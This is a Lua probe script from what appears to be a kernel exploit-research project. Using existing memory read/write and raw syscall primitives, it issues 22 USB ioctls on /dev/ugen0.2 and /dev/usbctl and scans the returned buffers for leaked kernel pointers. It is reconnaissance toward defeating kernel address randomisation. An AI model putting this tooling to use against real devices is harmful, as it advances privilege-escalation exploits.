-- CRASH_CLASS: SAFE
-- PROBE 1165a: do the USB driver ioctls hand back a kernel pointer?
--
-- Provenance: 288a swept every ioctl group on eight devfs nodes and found 19 live
-- commands on /dev/ugen0.2 plus 3 on /dev/usbctl (capture
-- results/phase17_new_vectors/288a_node_ioctl_groups_20261022_104212.txt).
-- 292a called them with a zeroed page and 293a varied the argument shape. Both
-- judged their hits by the RETURN VALUE. Nobody ever inspected the bytes that
-- came back. docs/DEVFS_GAP_ANALYSIS_14_10.md finding #4: copy_out has only ever
-- been detected on 4 nodes, and never by looking at buffer contents.
--
-- This probes closes exactly that: fill the argument buffer with a proved
-- sentinel, call each command, and print the 8 dwords that came back, plus an
-- explicit scan for kernel-pointer shapes (hi = 0xFFFF8xxx..0xFFFFFFFF).
-- An _IOR-8 command that returns a driver's device/softc pointer would be the
-- first real kernel pointer leak on 14.10.
--
-- Two bug classes this probe guards against, both of which have bitten the repo:
--   (a) a sentinel-unchanged claim that was never proven by a read-back
--       -> [S] fills and reads back before any call;
--   (b) a buffer printed next to an rv from a DIFFERENT call
--       -> the buffer is re-filled and re-read inside the same loop iteration
--          as the call it is printed with.
-- errno is only read when rv == -1 (a successful call leaves stale errno).
-- No command outside the 22 measured ones is issued; nothing destructive, no sweep.

print("=== PROBE 1165a: USB IOCTL COPY-OUT CONTENTS ===")
print("")

local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(uint64(a)) end); if ok then return to_num(v) end return -1 end

local sc_open=mk(5); local sc_close=mk(6); local sc_ioctl=mk(54)
local SIG_IGN = 1
pcall(function() signal(416, SIG_IGN) end)

local function errstr()
  local ok,r=pcall(get_error_string)
  if ok then return tostring(r) end
  return "<err:"..tostring(r):sub(1,40)..">"
end

local PB=0x100
local pa=as_addr(memory.alloc(PB))
local function setpath(p) for i=0,PB/4-1 do wd(pa+i*4,0) end for i=1,#p do pcall(function() memory.write_byte(uint64(pa+i-1),p:byte(i)) end) end end

local buf=as_addr(memory.alloc(0x4000))
local BUFB=0x400
local A5=0xA5A5A5A5
local function fill(addr,n) for i=0,n/4-1 do wd(addr+i*4,A5) end end
local function snap(addr,n) local t={} for i=0,n/4-1 do t[i]=rd(addr+i*4) end return t end
local function dw(t,i) return string.format("%08X",t[i] or 0) end
local function changed(t,n) local c={} for i=0,(n or BUFB)/4-1 do if t[i]~=A5 then c[#c+1]=i end end return c end

-- [S] prove the sentinel before trusting any "unchanged"
print("[S] sentinel proof (buffer filled with A5A5A5A5, read back):")
fill(buf,BUFB)
local s0=snap(buf,BUFB)
print(string.format("    dwords 0..7 = %s %s %s %s %s %s %s %s",dw(s0,0),dw(s0,1),dw(s0,2),dw(s0,3),dw(s0,4),dw(s0,5),dw(s0,6),dw(s0,7)))
local okfill=true
for i=0,BUFB/4-1 do if s0[i]~=A5 then okfill=false break end end
print("    fill_proved="..tostring(okfill))
if not okfill then print("    ABORT: sentinel did not land; 'unchanged' would be meaningless"); print(""); print("=== DONE ==="); return end

-- kernel-pointer shape test over the 8 qwords of a snapshot
local function kscan(t)
  local hits={}
  for i=0,7 do
    local lo=t[i*2] or 0
    local hi=t[i*2+1] or 0
    if hi==0xFFFFFFFF then
      hits[#hits+1]=string.format("q%d=FFFFFFFF%08X(MASK)",i,lo)
    elseif hi>=0xFFFF8000 then
      hits[#hits+1]=string.format("q%d=FFFFFFFF??%08X(KPTR-SHAPE %08X%08X)",i,lo,hi,lo)
    end
  end
  if #hits==0 then return "" end
  return " | "..table.concat(hits,",")
end

local nodes={ "ugen0.2", "usbctl" }
local cmds_ugen={
  0x80045506,0x80045565,0x80045571,0x80045572,0x80045576,0x80045577,
  0x80045578,0x8004557A,0x8004557B,0x8004557C,0x8004557D,0x80045580,
  0x80045588,0x80045589,
  0x40045564,0x40045575,0x40045587,0x4004558B,0x40045592,
}
local cmds_usbctl={ 0x40045594, 0x200055C9, 0x200055CA }

local nchanged, nkptr, ncall = 0,0,0
local klist={}
local fds={}

for _,node in ipairs(nodes) do
  local cmds = (node=="usbctl") and cmds_usbctl or cmds_ugen
  setpath("/dev/"..node)
  local fd=to_num(sc_open(uint64(pa),uint64(0)))
  local e0=errstr()
  print(string.format("[%s] open(O_RDONLY)=%d%s",node,fd,(fd<0) and (" errno="..e0) or ""))
  if fd<0 then
    local fd2=to_num(sc_open(uint64(pa),uint64(2)))
    print(string.format("[%s] open(O_RDWR)=%d%s",node,fd2,(fd2<0) and (" errno="..errstr()) or ""))
    if fd2>=0 then fd=fd2 end
  end
  if fd>=0 then
    fds[node]=fd
    for _,cmd in ipairs(cmds) do
      -- variant A: buffer base, sentinel-proved
      fill(buf,BUFB)
      local pre=snap(buf,BUFB)
      local r=to_num(sc_ioctl(uint64(fd),uint64(cmd),uint64(buf)))
      ncall=ncall+1
      local post=snap(buf,BUFB)
      local preok=true
      for i=0,BUFB/4-1 do if pre[i]~=A5 then preok=false break end end
      local c=changed(post,BUFB)
      local ks=kscan(post)
      if #c>0 then nchanged=nchanged+1 end
      if ks~="" then nkptr=nkptr+1; klist[#klist+1]=node.." "..string.format("0x%08X",cmd)..ks end
      print(string.format("    0x%08X rv=%d%s pre_ok=%s changed=%d%s",cmd,r,(r==-1) and (" errno="..errstr()) or "",tostring(preok),#c,ks))
      print(string.format("      after: %s %s %s %s %s %s %s %s",dw(post,0),dw(post,1),dw(post,2),dw(post,3),dw(post,4),dw(post,5),dw(post,6),dw(post,7)))
      if #c>0 then
        local s={}
        for i=1,#c do local j=c[i]; s[#s+1]=string.format("[%d]=%08X",j,post[j]) end
        print("      changed: "..table.concat(s," "))
      end
      -- variant B: argument pointer +0x80 (the _IOW-4 commands take a value or a small struct)
      if r==0 and cmd>=0x40000000 and cmd<0x80000000 then
        fill(buf,BUFB)
        local r2=to_num(sc_ioctl(uint64(fd),uint64(cmd),uint64(buf+0x80)))
        ncall=ncall+1
        local post2=snap(buf,BUFB)
        local c2=changed(post2,BUFB)
        if #c2>0 then nchanged=nchanged+1 end
        local ks2=kscan(post2)
        if ks2~="" then nkptr=nkptr+1; klist[#klist+1]=node.." "..string.format("0x%08X",cmd).."+0x80"..ks2 end
        print(string.format("    0x%08X arg=+0x80 rv=%d%s changed=%d%s",cmd,r2,(r2==-1) and (" errno="..errstr()) or "",#c2,ks2))
      end
    end
    pcall(function() sc_close(uint64(fd)) end)
  else
    print("    (no fd - commands not attempted)")
  end
end

print("")
print(string.format("[SUM] calls=%d commands_that_changed_the_buffer=%d commands_with_kernel_like_output=%d",ncall,nchanged,nkptr))
if nkptr>0 then
  for _,s in ipairs(klist) do print("  [KPTR] "..s) end
else
  print("  [KPTR] none - no 0xFFFF8xxx-shaped qword came back from any of these commands")
end
print("")
print("=== DONE ===")
